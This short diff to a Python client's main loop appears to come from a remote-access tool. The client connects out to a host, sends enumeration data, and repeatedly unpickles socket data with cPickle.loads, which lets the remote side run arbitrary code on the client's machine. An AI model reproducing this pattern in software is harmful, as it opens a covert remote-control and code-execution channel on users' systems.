@@ -80,8 +80,9 @@ def main():
 	sock = CrispyTCPClient().connect(host, port)
 	sock.send(json.dumps(enum()))
 	while True:
-	    data = cPickle.loads(sock.recv(1024))
-            sock.send(data)
+	    #data = cPickle.loads(sock.recv(1024))
+            data = sock.recv(1024)
+            sock.send(cPickle.loads(data))
     except KeyboardInterrupt: 
 	pass
     except:
